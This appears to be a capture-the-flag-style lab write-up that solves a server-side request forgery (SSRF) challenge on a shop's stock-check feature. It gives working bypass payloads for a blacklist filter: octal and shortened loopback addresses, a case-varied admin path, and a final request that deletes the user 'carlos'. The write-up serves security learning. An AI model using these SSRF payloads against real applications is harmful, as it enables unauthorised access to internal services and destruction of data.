## Lab Description :

<img width="1368" height="762" alt="Screenshot 2025-11-11 140030" src="https://github.com/user-attachments/assets/533b4acc-9fe6-4199-a45e-f0fde081fc94" />

## Solution:

This lab has a check stock feature with fetches data from internal server

<img width="1895" height="897" alt="Screenshot 2025-11-11 140447" src="https://github.com/user-attachments/assets/6ceed8ab-e622-4054-9fc5-9c9bb2dfbc5a" />

We use the check stock, back-end will return:

<img width="1870" height="621" alt="Screenshot 2025-11-11 140533" src="https://github.com/user-attachments/assets/eb821af4-a9ad-4bb4-8313-d3796761d05c" />

The stockApi parameter has a value:
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
```

We try with payload: ```stockApi=http://localhost/admin```


<img width="1841" height="623" alt="Screenshot 2025-11-11 140712" src="https://github.com/user-attachments/assets/e31f76b1-3ac4-4749-8341-748ca76fa10f" />

We know that the developer has developed the two weak anti-SSRF.

So, we try with some payloads like: ```2130706433, 017700000001, or 127.1 and the case variation```

I changed the ```admin``` to ```Admin``` to bypass the case variation

<img width="1809" height="632" alt="Screenshot 2025-11-11 141150" src="https://github.com/user-attachments/assets/66e833c9-37a1-4d9b-93ae-a0de907d66e2" />

The payload ``` stockApi=http://017700000001/Admin ``` is not work, so i try another one

``` stockApi=http://127.1/Admin ```


<img width="1862" height="695" alt="Screenshot 2025-11-11 141256" src="https://github.com/user-attachments/assets/2291e130-70a5-4bfe-b01f-88ec8f42bf6a" />

I successfully accessed the admin control panel

Then I delete the user ```Carlos```:


``` stockApi=http://127.1/Admin/delete?username=carlos ```

<img width="1843" height="630" alt="image" src="https://github.com/user-attachments/assets/1816beb3-0637-440b-9c76-0f5eb7620013" />


The lab has been solved


<img width="1896" height="907" alt="Screenshot 2025-11-11 141433" src="https://github.com/user-attachments/assets/e7019e83-d387-42f2-9bed-8bd96657831b" />

## Summary:
Developers can developed the anti-SSRF, but if we can combine different attack methos, we can bypass the filters
